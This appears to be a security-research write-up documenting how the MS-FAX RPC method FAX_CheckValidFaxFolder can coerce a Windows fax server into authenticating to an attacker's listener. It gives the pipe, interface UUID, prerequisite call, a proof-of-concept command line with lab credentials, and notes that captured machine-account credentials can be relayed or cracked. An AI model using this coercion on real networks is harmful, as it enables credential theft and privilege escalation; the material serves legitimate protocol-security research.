# MS-FAX - Remote call to FAX_CheckValidFaxFolder (opnum 86)

## Summary

+ **Protocol**: [[MS-FAX]: Fax Server and Client Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4)

+ **Protocol UUID**: ea0a3165-4834-11d2-a6f8-00c04fa346cc

+ **Protocol version**: 4.0

+ **SMB Named pipe**: `\PIPE\SHAREDFAX`

+ **Function name**: [`FAX_CheckValidFaxFolder`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/d348202c-d55b-40a9-b346-d6581278ce44)

+ **Function operation number**: `86`

+ **Authenticated**: Yes

> **Note on the interface UUID.** The `FAX_*` methods of MS-FAX are served on the FAXRPC
> interface `ea0a3165-4834-11d2-a6f8-00c04fa346cc` version **4.0**, reached over the
> `\PIPE\SHAREDFAX` named pipe. This is not the same interface as the legacy `FaxObs_*`
> methods (`6099fc12-3eff-11d0-abd0-00c04fd91a4e` version `0.0`); binding that UUID on
> `\PIPE\SHAREDFAX` is rejected with `abstract_syntax_not_supported`.

## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\SHAREDFAX` and bind to the [`MS-FAX`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4) FAXRPC interface (uuid `ea0a3165-4834-11d2-a6f8-00c04fa346cc`, version `4.0`).

`FAX_CheckValidFaxFolder` exists specifically to *"check whether the specified path is accessible to the fax server"* ([MS-FAX] 3.1.4.1.86). The `lpcwstrPath` parameter is a complete file path that **can be a UNC path**, and to validate it the server resolves that path — reaching out to the host it names. Pointing `lpcwstrPath` at a listener therefore causes the fax server to authenticate to it with the machine account.

Before this call can be made, the client MUST establish a fax connection with [`FAX_ConnectFaxServer`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/5cbfd38d-7a14-4560-ad24-9ed78f19a3bb) (opnum 80), which establishes the caller's fax user account context on the association. The proof of concept ([coerce_poc.py](./coerce_poc.py)) issues both calls on the same binding:

```cpp
FAX_ConnectFaxServer(dwClientAPIVersion = FAX_API_VERSION_3)   // opnum 80, prerequisite
FAX_CheckValidFaxFolder("\\<listener>\share\file.tif")         // opnum 86, coercion
```

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" <listener> <target>
```

On success the target authenticates to the SMB share `\\<listener>\share` using its machine account (e.g. `DC01$`). The captured authentication can then be relayed to other services to elevate privileges, or downgraded to NTLMv1 and cracked to recover the NT hash of the machine account.

## Function technical detail

```cpp
error_status_t FAX_CheckValidFaxFolder(
   [in] handle_t hBinding,
   [in, string, ref] LPCWSTR lpcwstrPath
 );
```

+ **hBinding**: The RPC binding handle. It should be the same binding handle used for the prior `FAX_ConnectFaxServer` (or `FAX_ConnectionRefCount`) call that connected to the fax server. As an implicit `handle_t`, it is not marshalled as a call parameter.

+ **lpcwstrPath**: A null-terminated string containing the path to validate, specified as a **complete file path**. The path **can be a UNC path** (`\\server\share\file`) or a path beginning with a drive letter. It **MUST contain a file name** — a bare `\\server\share` is rejected as incomplete. The length, including the terminating null character, MUST be under 180 characters.

### Return values relevant to coercion

| Code | Meaning |
|---|---|
| `ERROR_SUCCESS` (0x00000000) | The path is valid and accessible to the fax server. |
| `ERROR_FILE_NOT_FOUND` (0x00000002) | The folder path is valid but the file does not exist — the server resolved the folder, which is evidence it reached the target. |
| `ERROR_PATH_NOT_FOUND` (0x00000003) | The structure is valid but the folder does not exist. |
| `ERROR_ACCESS_DENIED` (0x00000005) | The caller's fax user account lacks `ALL_FAX_USER_ACCESS_RIGHTS`. |
| `ERROR_INVALID_PARAMETER` (0x00000057) | `lpcwstrPath` is NULL or the path is incomplete (e.g. missing a file name). |
| `ERROR_BUFFER_OVERFLOW` (0x0000006F) | The path length (with terminating null) exceeds 180 characters. |
| `FAX_ERR_DIRECTORY_IN_USE` (0x00001B5F) | The path points to a folder already in use by the fax server. |

## Conditions required for this call

+ **The Fax role/service must be present and running.** The `\PIPE\SHAREDFAX` pipe is registered by `fxssvc.exe` only while the service runs; it is a demand-start service that self-stops when idle.

+ **A prior `FAX_ConnectFaxServer` (opnum 80) call is required** to establish the fax user account context. Protocol versions `FAX_API_VERSION_0`/`_1` do not implement `FAX_CheckValidFaxFolder`; the server's API version is reported by `FAX_ConnectFaxServer`.

+ **The caller needs `ALL_FAX_USER_ACCESS_RIGHTS`** (`READ_CONTROL | WRITE_DAC | WRITE_OWNER | FAX_GENERIC_ALL_2` = `0x000E01FF`), the full fax-user rights set, otherwise the call returns `ERROR_ACCESS_DENIED`. The fax server security descriptor is stored at `HKLM\SOFTWARE\Microsoft\Fax\Security\Descriptor`.

## Testing status

This call is a **genuine UNC coercion primitive by specification** — the parameter is documented as accepting a UNC path that the server resolves for accessibility. The proof of concept binds the correct FAXRPC interface (`ea0a3165` v4.0), performs the `FAX_ConnectFaxServer` prerequisite, and issues `FAX_CheckValidFaxFolder` with a UNC path.

On a hardened **Windows Server 2025** domain controller (Fax role installed, service running), the call could **not** be driven to the folder-resolution stage remotely: `FAX_ConnectFaxServer` returns `rpc_s_access_denied` to a remote authenticated administrator over NTLM, even after the target account was granted the full `ALL_FAX_USER_ACCESS_RIGHTS`. That host had `RedirectionGuard=1` set (the post-CVE fax hardening), and the denial persisted regardless of the granted rights — indicating the fax service restricts the remote connection itself rather than failing on a fax-rights shortfall. The coercion is expected to be reachable on fax servers that permit the remote fax connection.

## References

+ Documentation of protocol [MS-FAX]: Fax Server and Client Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4

+ Documentation of function `FAX_CheckValidFaxFolder`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/d348202c-d55b-40a9-b346-d6581278ce44

+ Documentation of function `FAX_ConnectFaxServer`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/5cbfd38d-7a14-4560-ad24-9ed78f19a3bb
